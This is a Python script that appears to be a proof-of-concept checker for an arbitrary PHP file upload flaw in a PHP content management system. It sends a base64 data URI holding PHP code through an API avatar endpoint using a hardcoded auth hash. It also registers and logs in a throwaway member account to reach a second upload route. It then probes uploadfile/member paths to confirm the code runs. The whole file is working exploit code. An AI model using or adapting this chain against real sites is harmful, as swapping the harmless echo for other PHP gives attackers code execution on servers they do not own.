import requests,re,urllib3
from hashlib import md5
import base64


def randomLowercase(n):
	key=""
	zf="qwertyuiopasdfghjklzxcvbnm"
	import random
	for _ in range(n):
		suiji1=random.randint(0,len(zf)-1)
		key+=zf[suiji1]
	return key
def base64_encoding(string):
	string=base64.b64encode(string.encode())
	return string.decode()
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def randomInt(s,e):
	import random
	key=random.randint(int(s),int(e))
	return key
f1=str(randomInt(1000, 2000))
f2=base64_encoding("\""+md5(str(f1).encode()).hexdigest()+"\"")
f3=randomLowercase(8)
f4=base64_encoding(f'<?php echo "{f3}";?>')
def scan(baseurl):
	if baseurl[-1]=="/":
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	try:
		url=baseurl+f"index.php?c=api&m=data2&auth=50ce0d2401ce4802751739552c8e4467&param=update_avatar&file=data:image/php;base64,{f4}"
		headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
		response=requests.get(url,headers=headers,timeout=5,verify=False)
		if response.status_code == 200:
			r0=True
		else:
			r0=False
		if baseurl[-1]=="/":
			baseurl=baseurl
		else:
			baseurl=baseurl+"/"
		url=baseurl+"uploadfile/member/0/0x0.php"
		headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
		response=requests.get(url,headers=headers,timeout=5,verify=False)
		if response.status_code == 200:
			fl=[]
			for i in range(0,101):
				url=baseurl+f"uploadfile/member/{i}/0x0.php"
				response=requests.get(url,headers=headers,timeout=5,verify=False)
				if f3 in response.text:
					fl.append(1)
					break
			if len(fl)>0:
				r1=True
			else:
				r1=False
		else:
			r1=False
	except:
		r0=False
		r1=False
	username=randomInt(100000, 999999)
	email = randomLowercase(6)
	headers={"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}
	register_url=baseurl+"index.php?s=member&c=register&m=index"
	register_payload={"back":"","data[username]":username,"data[password]":"123456","data[password2]":"123456","data[email]":email+"@"+email+".com"}
	login_url=baseurl+"index.php?s=member&c=login&m=index"
	login_payload={"back":"","data[username]":username,"data[password]":"123456","data[auto]":"1"}
	vul_url=baseurl+"index.php?s=member&c=account&m=upload"
	vul_payload=f"tx=data:image/php;base64,{f4}"
	s = requests.session()
	resu=s.post(register_url,data=register_payload,headers=headers,timeout=5,verify=False)
	result=s.post(login_url,data=login_payload,headers=headers,timeout=5,verify=False)
	result2=s.post(vul_url,data=vul_payload,headers=headers,timeout=5,verify=False)
	url=baseurl+"uploadfile/member/3/0x0.php"
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
	response=requests.get(url,headers=headers,timeout=5,verify=False)
	if response.status_code == 200:
		flag=[]
		for i in range(3,101):
			url=baseurl+f"uploadfile/member/{i}/0x0.php"
			response=requests.get(url,headers=headers,timeout=5,verify=False)
			if f3 in response.text:
				flag.append(1)
				break
		if len(flag)>0:
			r2=True
		else:
			r2=False
	else:
		r2=False
	if (r1 and r0) or r2:
		return True
	else:
		return False
